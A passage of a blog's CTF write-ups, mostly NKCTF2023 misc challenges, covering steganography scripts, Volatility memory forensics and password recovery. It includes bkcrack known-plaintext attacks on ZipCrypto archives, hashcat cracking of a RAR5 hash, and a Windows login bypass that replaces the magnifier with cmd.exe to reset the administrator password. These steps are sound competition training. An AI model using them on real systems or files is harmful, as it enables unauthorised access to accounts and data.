src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-3.png"></p><h2 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h2><p>EyouCMS v1.6.1 反序列化漏洞</p><p>参考<a href="https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/">EyouCMS v1.6.1 0day挖掘</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;阿尼亚&quot;&gt;&lt;a href=&quot;#阿尼亚&quot; class=&quot;headerlink&quot; title=&quot;阿尼亚&quot;&gt;&lt;/a&gt;阿尼</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="红明谷" scheme="https://www.lewiserii.top/tags/%E7%BA%A2%E6%98%8E%E8%B0%B7/"/>
    
  </entry>
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="https://www.lewiserii.top/wp/NKCTF2023.html"/>
    <id>https://www.lewiserii.top/wp/NKCTF2023.html</id>
    <published>2023-03-26T13:00:00.000Z</published>
    <updated>2023-03-29T12:52:52.555Z</updated>
    
    <content type="html"><![CDATA[<p>rank：15</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p><p>复制一份cmd到放大镜</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p><p>进入系统</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p><h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>频谱找到<code>PSdB:74208645</code></p><p>波形转换得到<code>psdA:83979367</code></p><p>导出flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p><h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">参考文章</a></p><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p><h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p><p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p><p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p><p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p><p>放大图片观察到很多像素点，提取然后拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p><h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p><p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p><p>6位数字爆破，得到<code>114514</code></p><p>提示1：<code>“CA1N”也很“疑惑”呢</code></p><p>猜测是要对文件异或</p><p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p><p>得到一个加密的压缩包，根据提示2<code>ZipCrypto</code>，猜测是深入明文攻击</p><p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-1.png"></p><p>改密码</p><p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p><p>解压出来一个<code>handsome.jpg</code>和带密码的<code>5.rar</code></p><p>自拍照并没什么用，hashcat爆破<code>rar</code></p><p>rar2john提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p><p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p><p>最终得到密码<code>BUSADJ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-4.png"></p><p>解压出的图片尾藏了一个逆序的png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>修改高度，得到压缩包的密码<code>be8b06bc13780abf</code></p><p>解压出的<code>GGGGGGG.png</code>结尾有串字符<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p><p>32位的，推测为md5，在线网站得到<code>qwer1234</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-2.png"></p><p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p><p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p><p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p><p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-3.png"></p><h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p><p>先做<code>2023.3.2</code></p><p>看的出来，出题人很喜欢明文攻击</p><p><a href="https://pcapng.com/">pcapng文件格式</a></p><p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p><p>解压后得到<code>tonF.docx</code>和<code>usb.pcapng</code></p><p>对数据包分析，发现是usb键盘流量，使用<code>UsbMiceDataHacker</code>提取<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p><p>docx密码为<code>NKCTF2023_YYDS_YYDS!!!</code></p><p>进入文档后发现字体为<code>Byxs20_font</code></p><p>且文档中的内容复制后与文档内不一样了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-1.png"></p><p>odttf转ttf</p><p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p><p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p><p>python转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure><p>fontforge识别</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-2.png"></p><p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p><p>接着做<code>2023.3.4</code></p><p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-3.png"></p><p>提取<code>PYTHON.rar</code></p><p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-4.png"></p><p>用这个密钥恢复加密分区</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-5.png"></p><p>得到<code>bitlocker_is_very_interesting&#125;</code></p><p>最后看<code>2023.3.3</code></p><p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p><p>根据提示<code>3x3</code>，猜测是4进制</p><p>exiftool得到提示<code>上北下南左西右东</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-6.png"></p><p>python提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到<code>flag2 is here: 